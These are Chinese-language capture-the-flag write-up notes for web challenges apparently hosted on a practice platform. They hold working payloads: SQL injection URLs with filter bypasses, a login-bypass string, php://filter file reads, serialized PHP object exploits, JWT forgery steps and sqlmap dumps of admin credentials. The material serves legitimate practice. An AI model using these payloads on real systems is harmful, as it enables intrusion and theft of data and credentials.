[toc]
web6  web8  web22 好像被改了
web23 web16 还没整理
# web1 `变量覆盖`
http://123.206.31.85:10001/?a=&c=


# 流量分析 `telnet`
Telnet是明文传输的
过滤telnet
右键追踪tcp流得到flag


# web2 `md5爆破 robots.txt`


# web3 `响应头`

# web4 `easy sql注入`
```
http://123.206.31.85:10018/list.php?id=1 ok
http://123.206.31.85:10018/list.php?id=1' no
http://123.206.31.85:10018/list.php?id=1'--+  ok
--+注释可以
http://123.206.31.85:10018/list.php?id=1' order by 1--+   no
http://123.206.31.85:10018/list.php?id=1' oorrder by 1--+  ok
http://123.206.31.85:10018/list.php?id=1' oorrder by 2--+  ok
http://123.206.31.85:10018/list.php?id=1' oorrder by 3--+  ok
http://123.206.31.85:10018/list.php?id=1' oorrder by 4--+  no
3列 并且or被过滤 需双写
http://123.206.31.85:10018/list.php?id=-1' union select 1,2,3--+  no
http://123.206.31.85:10018/list.php?id=-1' uniunionon seselectlect 1,2,3--+   返回2 3
union 和 select 被过滤 需双写绕过 2 3位回显
http://123.206.31.85:10018/list.php?id=-1' uniunionon seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()--+  返回  ctf,flag  3 
这里information中的or需双写
http://123.206.31.85:10018/list.php?id=-1' uniunionon seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+  id,flag  3
http://123.206.31.85:10018/list.php?id=-1' uniunionon seselectlect 1,flag,3 from flag--+
```
# web5 `python写个脚本`
```python
import requests
import re
url = 'http://123.206.31.85:10020/?key='
s = requests.Session()
aa = s.get(url).content
print aa
aa = re.search(r'\w+',aa).group()
print aa
print s.get(url+aa).content
```
比较迷的一题
拼网速 有几率得到flag

# web6 **好像被改了**
http://123.206.31.85:10025
new bugku web25



# web7 `伪协议`
http://123.206.31.85:10003/?op=php://filter/convert.base64-encode/resource=flag


# web8 `万能密码`
http://123.206.31.85:10004/login.php
username=admin' or '1'='1'%23&password=


# web8 **差最后一步 也好像被改了**
http://123.206.31.85:10008/
源码泄露
http://123.206.31.85:10008/.idea/workspace.xml
http://123.206.31.85:10008/www.tar.gz

login.php和register.php使用PDO预处理执行SQL语句防止SQL注入
![](https://ws1.sinaimg.cn/large/0074VeWzly1g2lk296x5gj30l20craam.jpg)
但是update.php中age没有进行任何防护
![](https://ws1.sinaimg.cn/large/0074VeWzly1g2lk2h2hmjj30sw013gli.jpg)
由于年龄的输入框限制了只能输数字，则需要更改一下页面源代码
删除type的number
然后输入
输入 1^1，点击更新资料后
返回0
则年龄处存在整型注入
```
1.获取当前数据库名
hex(database())
更新后显示
77656238
转换成字符后为
web8

2.获取表名
hex(select group_concat(table_name) from information_schema.tables where table_schema=database())
显示更新错误，后来才知道要在外面再加一层括号
hex((select group_concat(table_name) from information_schema.tables where table_schema=database()))
7573657273
users

3.获取表字段名
hex((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273))
数据太大，没有在输入框显示，在下方源代码中，转换成字符后为
id,username,password,nickname,age,description

4.获取数据




(select database())
(select group_concat(table_name) from information_schema.tables where table_schema = 0x77656238)
(select group_concat(column_name) from information_schema.columns where table_schema = 0x77656238 and table_name = 0x7573657273)

```

用bp抓包修改放包也可以
要注意csrf-token的处理 即一次的token只能更新一次

# web10  `文件泄露`
index.php~
```php
<?php
header('content-type:text/html;charset=utf-8');
include './flag.php';
error_reporting(0);
if(empty($_GET['id'])){
    header('location:./1ndex.php');
}else{
	$id = $_GET['id'];
	if (!is_numeric($id)) {
		$id = intval($id);
		switch ($id) {
			case $id>=0:
				echo "快出去吧，走错路了～～～<br>";
				echo "这么简单都不会么？";
				break;
			case $id>=10:
				exit($flag);
				break;
			default:
				echo "你走不到这一步的!";
				break;
		}
	}
}

?>
```
http://123.206.31.85:10015/index.php?id=a10



# web22 **好像被改了**
```
hhhhArray ( [0] => .. [1] => dev [2] => etc [3] => bin [4] => usr [5] => lib64 [6] => lib [7] => web [8] => tmp [9] => log `[10] => . [11] => ) 
```

http://123.206.31.85:10022/hello.php?file=php://filter/convert.base64-encode/resource=haha.php
```php
haha.php
<?php      echo "hhhh";      $dr = @opendir('/');    if(!$dr) {      echo "Error opening the /tmp/ directory!<BR>";      exit;    }     while(($files[] = readdir($dr)) !== false);     print_r($files);  ?>
```

http://123.206.31.85:10022/hello.php?file=php://filter/convert.base64-encode/resource=hello.php
```php
hello.php
<!--upload.php-->  <?php  error_reporting(0);  if(isset($_GET['file'])){      include $_GET['file'];    }  ?>
```
http://123.206.31.85:10022/hello.php?file=php://filter/convert.base64-encode/resource=index.php
```php
index.php
<html>      <head>          <title></title>      </head>      <body>      </body>  </html>  <?php  header('content-type:text/html;charset=utf-8');  header('location:./hello.php?file=haha.php');    
```



# web21 `反序列化 php伪协议`
http://123.206.31.85:10021/
```php
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```
http://123.206.31.85:10021/?user=php://input&file=php://filter/convert.base64-encode/resource=class.php
admin
```php
class.php
<?php  
error_reporting(E_ALL & ~E_NOTICE);     
class Read{//f1a9.php      
	public $file;      
	public function __toString(){          
		if(isset($this->file)){              
			echo file_get_contents($this->file); 
		}          
		return "__toString was called!";      
	}  
}  
?>
```
http://123.206.31.85:10021/?user=php://input&file=php://filter/convert.base64-encode/resource=index.php
```php
index.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}
 
?>
 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```
view-source:http://123.206.31.85:10021/?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
admin
```php
<?php
class Read{//f1a9.php      
	public $file;      
	public function __toString(){          
		if(isset($this->file)){              
			echo file_get_contents($this->file); 
		}          
		return "__toString was called!";      
	}  
}
$a = new Read();
$a->file = 'f1a9.php';
echo serialize($a);
?>
```



# web23
http://123.206.31.85:10023/
http://123.206.31.85:10023/robots.txt
http://123.206.31.85:10023/readme.txt
```
网站默认登录用户名和密码为
admin
123

用户登录后可自行修改密码
密码只支持3位数字


你也想学php验证码啊

http://123.206.31.85:10023/1.png
```
http://123.206.31.85:10023/admin/login.php


# web7 `修改响应头`
http://123.206.31.85:10007/
注册登陆 显示权限不够
抓包
![](http://ww1.sinaimg.cn/large/0074VeWzly1g0ad2qt8esj315l0gyq4q.jpg)
admin的md5
21232f297a57a5a743894a0e4a801fc3
![](http://ww1.sinaimg.cn/large/0074VeWzly1g0ad4g8pg7j316q0h741p.jpg)


# web12 `反序列化 科学记数法十六进制绕过 一个cve`
http://123.206.31.85:10012/
```php
class Time{
	public $flag = ******************;
	public $truepassword = ******************;
	public $time;
	public $password ;
	public function __construct($tt, $pp) {
    $this->time = $tt;
    $this->password = $pp;
    }
	function __destruct(){
		if(!empty($this->password))
		{
			if(strcmp($this->password,$this->truepassword)==0){
				echo "<h1>Welcome,you need to wait......<br>The flag will become soon....</h1><br>";
				if(!empty($this->time)){
					if(!is_numeric($this->time)){
						echo 'Sorry.<br>';
						show_source(__FILE__);
					}
					else if($this->time < 11 * 22 * 33 * 44 * 55 * 66){
						echo 'you need a bigger time.<br>';
					}
					else if($this->time > 66 * 55 * 44 * 33 * 23 * 11){
						echo 'you need a smaller time.<br>';
					}
					else{
						sleep((int)$this->time);
						var_dump($this->flag);
					}
					echo '<hr>';
				}
				else{
					echo '<h1>you have no time!!!!!</h1><br>';
				}
			}
			else{
				echo '<h1>Password is wrong............</h1><br>';
			}
		}
		else{
			echo "<h1>Please input password..........</h1><br>";
		}
	}
	function __wakeup(){
		$this->password = 1; echo 'hello hacker,I have changed your password and time, rua!';
	}
}
if(isset($_GET['rua'])){
	$rua = $_GET['rua'];
	@unserialize($rua);
}
else{
	echo "<h1>Please don't stop rua 233333</h1><br>";
}
```
payload:`view-source:http://123.206.31.85:10012/?rua=O:4:"Time":3:{s:4:"time";s:4:"13e8";s:8:"password";a:1:{s:1:"s";s:2:"ss";};}`
1.3e9
0x4c06f351
0x4c06f350
```php
<?php
class Time{
	public $time = '13e8';
	public $password = array('s');
}

$a = new Time();
echo serialize($a);

?>
```
# web24 `反序列化 base64 private __wakeup`
http://123.206.31.85:10024/
http://123.206.31.85:10024/index/index.php
```php
<?php  
class Small_white_rabbit{  
    private $file = 'index.php';  

    public function __construct($file) {  
        $this->file = $file;  
    }  

    function __destruct() {  
        echo @highlight_file($this->file, true);  
    }  

    function __wakeup() {  
        if ($this->file != 'index.php') {  
            //the secret is in the_f1ag.php  
            $this->file = 'index.php';  
        }  
    }  
}  

if (isset($_GET['var'])) {  
    $var = base64_decode($_GET['var']);  
    @unserialize($var);  
} else {  
    highlight_file("index.php");  
}  
?>
```
```php
<?php 
class Small_white_rabbit{ 
    private $file = 'the_f1ag.php'; 
} 
$a = new Small_white_rabbit('the_f1ag.php');
$bb = serialize($a);
$bb = str_replace(':1:', ':2:', $bb);
echo $bb;
echo base64_encode($bb);
?>

TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==
```
http://123.206.31.85:10024/index/index.php?var=TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==


# web10  `jwt 伪造`
http://123.206.31.85:3032/L3yx.php
.swp
```php
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>在线日记本</title>
<form action="" method="POST">
  <p>username: <input type="text" name="username" /></p>
  <p>password: <input type="password" name="password" /></p>
  <input type="submit" value="login" />
</form>
<!--hint:NNVTU23LGEZDG===-->
</html>

<?php
    error_reporting(0);
    require_once 'src/JWT.php';

    const KEY = 'L3yx----++++----';

    function loginkk()
    {
        $time = time();
        $token = [
          'iss'=>'L3yx',
          'iat'=>$time,
          'exp'=>$time+5,
          'account'=>'kk'
        ];
        $jwt = \Firebase\JWT\JWT::encode($token,KEY);
        setcookie("token",$jwt);
        header("location:user.php");
    }

    if(isset($_POST['username']) && isset($_POST['password']) && $_POST['username']!='' && $_POST['password']!='')
    {
        if($_POST['username']=='kk' && $_POST['password']=='kk123')
        {
            loginkk();
        }
        else
        {
            echo "账号或密码错误";
        }
    }
?> 
```
https://jwt.io/
登陆抓包
![](http://ww1.sinaimg.cn/large/0074VeWzly1g098vm1hb4j31fp0n6769.jpg)
![](http://ww1.sinaimg.cn/large/0074VeWzly1g098xb93pfj318s0kln02.jpg)
![](http://ww1.sinaimg.cn/large/0074VeWzly1g099qe7xhgj31750l20u3.jpg)
得到token
两次forward 到这个界面
![](http://ww1.sinaimg.cn/large/0074VeWzly1g098y4clk5j31er0mggpu.jpg)
关闭bp的拦截开关 在打开 去网页刷新一下 再次拦截 修改token
最后一下forward
最终
![](http://ww1.sinaimg.cn/large/0074VeWzly1g099ne1d3cj30hl0j2dgi.jpg)

# web19  `html隐写 git泄露 sqlmap -r注入 反序列化`
http://123.206.31.85:10019/
git泄露 读取
Hint 1: flag is in /eXpl0ve5p0cVeRymuCh
随便输入username 1 password 1 抓包 右键 copy to file 222.txt
```
POST /eXpl0ve5p0cVeRymuCh/index.php HTTP/1.1
Host: 123.206.31.85:10019
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php
Cookie: PHPSESSID=igigfrkp4vjvmqpvol3v4mn6kc6615s4;
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=1&password=1
```
```
python2 .\sqlmap.py -r 222.txt --level 5
出现username可注入

python2 .\sqlmap.py -r 222.txt -p username --dbs
available databases [2]:
[*] information_schema
[*] web19

python2 .\sqlmap.py -r 222.txt -p username --tables -D web19
[2 tables]
+--------+
| user   |
| hlnt_2 |
+--------+

python2 .\sqlmap.py -r 222.txt -p username --columns -T hlnt_2 -D web19
[2 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| hInt   | text    |
| id     | int(11) |
+--------+---------+

python2 .\sqlmap.py -r 222.txt -p username --dump all -C hInt -T hlnt_2 -D web19
[1 entry]
+-----------------------------------------------+
| hInt                                          |
+-----------------------------------------------+
| a class for you "https://postimg.cc/6274vCP5" |
+-----------------------------------------------+
```
![](http://ww1.sinaimg.cn/large/0074VeWzly1g0afh9mp7nj30zk0a60uf.jpg)
接着注入吧 看看账号密码
```
python2 .\sqlmap.py -r 222.txt -p username --columns -T user -D web19
[3 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| id       | int(11) |
| password | text    |
| username | text    |
+----------+---------+

python2 .\sqlmap.py -r 222.txt -p username -C "id,username,password" -T user -D web19 --dump all
[1 entry]
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
| 1  | admin    | p0CLOvesExpT00 |
+----+----------+----------------+
```
登陆 跳转到这里
http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/note.php
```
GET /eXpl0ve5p0cVeRymuCh/note.php HTTP/1.1
Host: 123.206.31.85:10019
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: text=O%3A8%3A%22UserInfo%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A14%3A%22p0CLOvesExpT00%22%3B%7D; PHPSESSID=igigfrkp4vjvmqpvol3v4mn6kc6615s4
Connection: keep-alive
```
![](http://ww1.sinaimg.cn/large/0074VeWzly1g0ai3ttl0tj31350i5juh.jpg)

这里有很多提示 html隐写 snow隐写
snow.exe  everything搜索得到
view-source:http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/note.php
ctrl+s 保存为111.html
`.\SNOW.EXE -C -p ILOveExp 111.html`
flag in /PPPPOOO0CCCC.php
http://123.206.31.85:10019/PPPPOOO0CCCC.php
一片空白
构造跟上面一样的cookie中的text参数 根据那个序列化
还是上面那个请求包
```php
<?php
class ReadFile{
	public $file='../../PPPPOOO0CCCC.php';
	public function __destruct(){
		echo file_get_contents(dirname(__FILE__).$this->file);
	}
}
$a=new ReadFile;
echo serialize($a);
?>
O:8:"ReadFile":1:{s:4:"file";s:22:"../../PPPPOOO0CCCC.php";}
```
![](http://ww1.sinaimg.cn/large/0074VeWzly1g0ai9nlpzxj312l0fstbh.jpg)


# web16
http://123.206.31.85:1616/



